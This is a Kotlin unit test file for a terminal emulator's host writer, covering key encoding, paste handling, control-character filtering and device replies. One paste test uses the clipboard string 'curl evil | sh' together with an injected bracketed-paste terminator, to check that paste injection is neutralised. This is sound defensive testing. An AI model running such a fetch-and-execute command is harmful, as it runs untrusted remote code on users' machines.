/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

@file:OptIn(InternalVtfxApi::class)

package com.google.vtfx.gate

import com.google.vtfx.core.ColorTarget
import com.google.vtfx.core.GraphicsStatus
import com.google.vtfx.core.InternalVtfxApi
import com.google.vtfx.core.KeyModifiers
import com.google.vtfx.core.KeyStroke
import com.google.vtfx.core.TerminalKey
import com.google.vtfx.core.TerminalQuery
import com.google.vtfx.testing.terminalModes
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import org.junit.Test

class HostWriterTest {
    private val sent = mutableListOf<String>()
    private val writer = HostWriter { sent += String(it, Charsets.UTF_8) }

    @Test
    fun textRefusesLineBreaks() {
        for (text in listOf("a\nb", "a\r\nb", "a\rb", "\n", "\r")) {
            assertFailsWith<IllegalArgumentException> { writer.sendText(text) }
        }
        assertEquals(emptyList(), sent)
    }

    @Test
    fun clipboardTextIsSentAsOnePaste() {
        writer.sendPaste(ClipboardText("echo safe\ncurl evil | sh\n\u001b[201~"), bracketed = true)
        assertEquals(listOf("\u001b[200~echo safe\rcurl evil | sh\r[201~\u001b[201~"), sent)
    }

    @Test
    fun pasteConvertsLineBreaksToCr() {
        writer.sendPaste("a\nb\r\nc\rd", bracketed = false)
        assertEquals(listOf("a\rb\rc\rd"), sent)
    }

    @Test
    fun textKeepsTabAndDropsOtherControls() {
        writer.sendText("a\tb\u0000\u0003\u001b[31m\u007f\u0085\u009bc")
        assertEquals(listOf("a\tb[31mc"), sent)
    }

    @Test
    fun textReplacesUnpairedSurrogates() {
        writer.sendText("a\uD83Db\uDE00\uD83D\uDE00")
        assertEquals(listOf("a\uFFFDb\uFFFD\uD83D\uDE00"), sent)
    }

    @Test
    fun textWithOnlyControlsSendsNothing() {
        writer.sendText("\u001b\u0007")
        assertEquals(emptyList(), sent)
    }

    @Test
    fun characterKeyOfAControlSendsNothing() {
        writer.sendKey(characterKey(0x1B, KeyModifiers.of(alt = true)), terminalModes())
        assertEquals(emptyList(), sent)
    }

    @Test
    fun deletesSendDel() {
        writer.sendDeletes(3)
        assertEquals(listOf("\u007f\u007f\u007f"), sent)
        assertFailsWith<IllegalArgumentException> { writer.sendDeletes(0) }
    }

    @Test
    fun keysAreEncodedUnderTheModes() {
        writer.sendKey(KeyStroke.Special(TerminalKey.Up), terminalModes())
        writer.sendKey(
            KeyStroke.Special(TerminalKey.Up),
            terminalModes(applicationCursorKeys = true),
        )
        writer.sendKey(KeyStroke.Special(TerminalKey.Enter), terminalModes(newLine = true))
        writer.sendKey(characterKey('c'.code, KeyModifiers.of(ctrl = true)), terminalModes())
        assertEquals(listOf("\u001b[A", "\u001bOA", "\r\n", "\u0003"), sent)
    }

    @Test
    fun repliesAreBuiltFromTheQuery() {
        writer.sendReply(TerminalQuery.PrimaryDeviceAttributes)
        writer.sendReply(TerminalQuery.SecondaryDeviceAttributes)
        writer.sendReply(TerminalQuery.OperatingStatus)
        writer.sendReply(TerminalQuery.CursorPosition(3, 14, isDecPrivate = false))
        writer.sendReply(TerminalQuery.CursorPosition(1, 1, isDecPrivate = true))
        assertEquals(
            listOf(
                "\u001b[?62;22c",
                "\u001b[>0;10;1c",
                "\u001b[0n",
                "\u001b[3;14R",
                "\u001b[?1;1R",
            ),
            sent,
        )
    }

    @Test
    fun cursorPositionOutOfRangeIsAProgrammingError() {
        assertFailsWith<IllegalArgumentException> {
            writer.sendReply(TerminalQuery.CursorPosition(0, 1, false))
        }
    }

    @Test
    fun paletteIndexOutOfRangeIsAProgrammingError() {
        // The index is checked before the display is asked for the color: a display that looks it
        // up in its palette must not be given an index beyond it, and the check does not depend on
        // whether the display has the color.
        val palette = IntArray(256)
        val fromPalette = ReportedColors { target ->
            palette[(target as ColorTarget.Palette).index]
        }
        for (index in listOf(-1, 256)) {
            for (colors in listOf(fromPalette, ReportedColors { null }, null)) {
                assertFailsWith<IllegalArgumentException>("$index") {
                    writer.sendReply(TerminalQuery.Color(ColorTarget.Palette(index)), colors)
                }
            }
        }
        assertEquals(emptyList(), sent)
    }

    @Test
    fun graphicsReplyWithoutAnImageIdOrNumberIsAProgrammingError() {
        // Only commands with an image id or number are answered (section 9.2 of emulation.md).
        assertFailsWith<IllegalArgumentException> {
            writer.sendReply(TerminalQuery.GraphicsReply(0, 0, 0, GraphicsStatus.Ok))
        }
        assertFailsWith<IllegalArgumentException> {
            writer.sendReply(TerminalQuery.GraphicsReply(0, 0, 5, GraphicsStatus.NotFound))
        }
        assertEquals(emptyList(), sent)
    }

    @Test
    fun focusReports() {
        writer.sendFocus(true)
        writer.sendFocus(false)
        assertEquals(listOf("\u001b[I", "\u001b[O"), sent)
    }

    @Test
    fun theConnectionOwnsTheBytesItIsGiven() {
        // A connection may overwrite what it sent, for example to wipe it, without changing what
        // later calls send.
        val writer = HostWriter { bytes ->
            sent += String(bytes, Charsets.UTF_8)
            bytes.fill('x'.code.toByte())
        }
        repeat(2) {
            writer.sendFocus(true)
            writer.sendFocus(false)
            writer.sendPaste("a", bracketed = true)
            writer.sendKey(KeyStroke.Special(TerminalKey.Up), terminalModes())
            writer.sendReply(TerminalQuery.OperatingStatus)
        }
        val once =
            listOf("\u001b[I", "\u001b[O", "\u001b[200~a\u001b[201~", "\u001b[A", "\u001b[0n")
        assertEquals(once + once, sent)
    }

    @Test
    fun sendingFromTheConnectionIsAProgrammingError() {
        lateinit var nested: HostWriter
        var calls = 0
        nested = HostWriter { if (calls++ == 0) nested.sendText("b") }
        assertFailsWith<IllegalStateException> { nested.sendText("a") }
        // The writer is usable again afterwards.
        val writer = HostWriter { sent += String(it, Charsets.UTF_8) }
        writer.sendText("c")
        assertEquals(listOf("c"), sent)
    }

    @Test
    fun knowsWhetherTheCurrentThreadIsInTheConnection() {
        lateinit var writer: HostWriter
        val inside = mutableListOf<Boolean>()
        writer = HostWriter {
            inside += writer.isWritingOnCurrentThread()
            val thread = Thread { inside += writer.isWritingOnCurrentThread() }
            thread.start()
            thread.join()
        }
        assertEquals(false, writer.isWritingOnCurrentThread())
        writer.sendText("a")
        assertEquals(listOf(true, false), inside)
        assertEquals(false, writer.isWritingOnCurrentThread())
    }
}

/** A character key with no place on a keyboard, as a key bar of an app sends. */
private fun characterKey(codePoint: Int, modifiers: KeyModifiers = KeyModifiers.None) =
    KeyStroke.Character(codePoint, modifiers, Character.toLowerCase(codePoint), null)
